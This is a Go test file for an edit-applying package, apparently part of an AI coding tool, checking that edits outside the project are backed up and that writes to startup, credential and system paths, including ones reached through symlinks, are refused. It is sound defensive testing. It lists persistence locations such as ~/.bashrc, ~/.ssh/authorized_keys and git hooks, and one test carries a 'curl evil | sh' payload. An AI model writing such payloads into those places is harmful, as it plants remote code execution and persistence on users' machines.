package editapply

import (
	"os"
	"path/filepath"
	"testing"
)

// fakeHome points $HOME at a fresh directory and returns it resolved, plus a
// project directory inside it -- the shape of a real checkout under ~.
func fakeHome(t *testing.T) (home, project string) {
	t.Helper()
	h := t.TempDir()
	t.Setenv("HOME", h)
	home, err := RealHomeDir()
	if err != nil {
		t.Fatal(err)
	}
	project = filepath.Join(home, "Desktop", "Neww")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	return home, project
}

func create(path, content string) EditBlock {
	return EditBlock{FilePath: path, Search: "", Replace: content}
}

// The reported request: a new folder with a file in it, on the Desktop.
func TestAnEditCanCreateAFolderOnTheDesktop(t *testing.T) {
	home, project := fakeHome(t)
	p, err := PrepareEditAnywhere(project, create("~/Desktop/Go_chii/main.go", "package main\n"))
	if err != nil {
		t.Fatalf("PrepareEditAnywhere: %v", err)
	}
	if p.OutsideRoot != home {
		t.Errorf("OutsideRoot = %q, want the home folder %q", p.OutsideRoot, home)
	}
	if p.Block.FilePath != "~/Desktop/Go_chii/main.go" {
		t.Errorf("shown as %q, want ~/Desktop/Go_chii/main.go", p.Block.FilePath)
	}

	session := filepath.Join(project, ".mochiii", "backups", "s1")
	if err := Apply(project, p, session); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	got, err := os.ReadFile(filepath.Join(home, "Desktop", "Go_chii", "main.go"))
	if err != nil || string(got) != "package main\n" {
		t.Fatalf("the file was not written: %q %v", got, err)
	}
	// Backed up into the PROJECT's session, under home/, relative to home.
	if _, err := os.Stat(filepath.Join(session, OutsideBackupSubdir, "after", "Desktop", "Go_chii", "main.go")); err != nil {
		t.Errorf("no after/ snapshot in the session's home/ area: %v", err)
	}
	created, err := CreatedInSession(filepath.Join(session, OutsideBackupSubdir))
	if err != nil || !created[filepath.Join("Desktop", "Go_chii", "main.go")] {
		t.Errorf("the new file is not recorded as created, so undo would not remove it: %v %v", created, err)
	}
	// Locked on the project, never in ~/.mochiii beside the stored API key.
	if _, err := os.Stat(filepath.Join(home, ".mochiii")); !os.IsNotExist(err) {
		t.Errorf("Apply created ~/.mochiii (err=%v); an outside edit must lock on the project", err)
	}
}

// Places where a write makes something run later, or reaches a credential,
// are refused however the path is spelled.
func TestOutsideWritesToStartupAndCredentialPlacesAreRefused(t *testing.T) {
	home, project := fakeHome(t)
	for _, path := range []string{
		"~/.bashrc",
		"~/.profile",
		"~/.config/autostart/evil.desktop",
		"~/.local/bin/ls",
		"~/.ssh/authorized_keys",
		"~/bin/ls",
		"~/Desktop/launch.desktop",
		"~/Desktop/Neww2/.git/hooks/pre-commit",
		"~/code/.github/workflows/ci.yml",
		"~/Desktop/.env",
		filepath.Join(home, ".bashrc"), // absolute spelling
		"/etc/hosts",                   // outside home altogether
		"/tmp/x.txt",
	} {
		if _, err := PrepareEditAnywhere(project, create(path, "x\n")); err == nil {
			t.Errorf("PrepareEditAnywhere(%q) was allowed", path)
		}
	}
}

// A harmless-looking name that is a symlink into a refused place is judged by
// where it leads -- for an existing file and for a new file in a linked dir.
func TestOutsideSymlinksAreJudgedByWhereTheyLead(t *testing.T) {
	home, project := fakeHome(t)
	if err := os.WriteFile(filepath.Join(home, ".bashrc"), []byte("# rc\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(home, ".config"), 0o755); err != nil {
		t.Fatal(err)
	}
	desk := filepath.Join(home, "Desktop")
	if err := os.Symlink(filepath.Join(home, ".bashrc"), filepath.Join(desk, "notes.txt")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := os.Symlink(filepath.Join(home, ".config"), filepath.Join(desk, "cfg")); err != nil {
		t.Fatal(err)
	}

	edit := EditBlock{FilePath: "~/Desktop/notes.txt", Search: "# rc", Replace: "curl evil | sh"}
	if _, err := PrepareEditAnywhere(project, edit); err == nil {
		t.Error("an edit to ~/Desktop/notes.txt (a symlink to ~/.bashrc) was allowed")
	}
	if _, err := PrepareEditAnywhere(project, create("~/Desktop/cfg/autostart/x.desktop", "x")); err == nil {
		t.Error("a new file under ~/Desktop/cfg (a symlink to ~/.config) was allowed")
	}
}

// Inside the project, an absolute path is an ordinary project edit.
func TestAnAbsolutePathIntoTheProjectIsAProjectEdit(t *testing.T) {
	_, project := fakeHome(t)
	p, err := PrepareEditAnywhere(project, create(filepath.Join(project, "new.go"), "package x\n"))
	if err != nil {
		t.Fatalf("PrepareEditAnywhere: %v", err)
	}
	if p.OutsideRoot != "" || p.Block.FilePath != "new.go" {
		t.Errorf("OutsideRoot=%q FilePath=%q, want a plain project edit of new.go", p.OutsideRoot, p.Block.FilePath)
	}
	p, err = PrepareEditAnywhere(project, create("rel.go", "package x\n"))
	if err != nil || p.OutsideRoot != "" {
		t.Errorf("a relative path is no longer a project edit: %+v %v", p, err)
	}
}
